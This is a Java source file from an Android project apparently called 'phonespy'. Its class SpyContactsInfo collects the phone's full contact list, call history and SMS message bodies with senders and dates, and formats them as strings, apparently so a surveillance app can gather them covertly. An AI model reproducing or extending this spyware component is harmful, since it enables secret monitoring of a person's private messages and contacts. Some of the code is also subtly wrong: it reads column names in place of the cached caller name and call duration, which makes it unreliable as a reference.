package info.peoce.phonespy.Util;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import info.peoce.phonespy.App;
import info.peoce.phonespy.model.CallLog;
import info.peoce.phonespy.model.Person;
import info.peoce.phonespy.model.ShortMessage;

/**
 * Created by peoce on 15/10/17.
 */
public class SpyContactsInfo {
    static ContentResolver contentResolver;

    static {
        contentResolver = App.getContext().getContentResolver();
    }

    static public String getContactsList() {
        ArrayList personList = null;
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone._ID,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
        if (cursor != null) {
            personList = new ArrayList();
            while (cursor.moveToNext()) {
                int _id = 0;
                String name = null, phoneNumber = null;
                try {
                    _id = cursor.getInt(0);
                    name = cursor.getString(1);
                    phoneNumber = cursor.getString(2);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                personList.add(new Person(_id, name, phoneNumber));
            }
            cursor.close();
        }
        return personList != null ? personList.toString() : "contacts is null";
    }

    static public String getCallLog() {
        List<CallLog> callLogList = null;
        Cursor cursor = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            callLogList = new ArrayList();
            do {
                String phoneNumber = cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                String callType = null;
                switch (Integer.parseInt(cursor.getString(cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)))) {
                    case android.provider.CallLog.Calls.INCOMING_TYPE:
                        callType = "来电";
                        break;
                    case android.provider.CallLog.Calls.OUTGOING_TYPE:
                        callType = "呼出";
                        break;
                    case android.provider.CallLog.Calls.MISSED_TYPE:
                        callType = "未接";
                        break;
                    default:
                        callType = "挂断";
                }
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                Date date = new Date(Long.parseLong(cursor
                        .getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE))));
                String dateString = sdf.format(date);
                String contactsName = cursor.getColumnName(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME));
                String duration = cursor.getColumnName(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION));
                callLogList.add(new CallLog(phoneNumber, callType, duration, contactsName, dateString));
            } while (cursor.moveToNext());
            cursor.close();
        }
        return callLogList != null ? callLogList.toString() : "call log is null";
    }


    static public String getMessageList() {
        List<ShortMessage> shortMessageList = null;
        Cursor cursor = contentResolver.query(Uri.parse("content://sms/"), new String[]{"_id", "address", "person"
                , "body", "date", "type"}, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            shortMessageList = new ArrayList();
            String name;
            String phoneNumber;
            String smsbody;
            String type;
            String date;

            int addressCol = cursor.getColumnIndex("address");
            int personCol = cursor.getColumnIndex("person");
            int bodyCol = cursor.getColumnIndex("body");
            int dateCol = cursor.getColumnIndex("date");
            int typeCol = cursor.getColumnIndex("type");

            do {
                name = cursor.getString(personCol);
                phoneNumber = cursor.getString(addressCol);
                smsbody = cursor.getString(bodyCol);
                int typeInt = cursor.getInt(typeCol);
                if (typeInt == 1) {
                    type = "接收";
                } else if (typeInt == 2) {
                    type = "发送";
                } else {
                    type = "未知";
                }
                Date d = new Date(Long.parseLong(cursor.getString(dateCol)));
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                date = sdf.format(d);
                shortMessageList.add(new ShortMessage(name, smsbody, date, type, phoneNumber));
            } while (cursor.moveToNext());
            cursor.close();
        }
        return shortMessageList != null ? shortMessageList.toString() : "sms is null";
    }
}
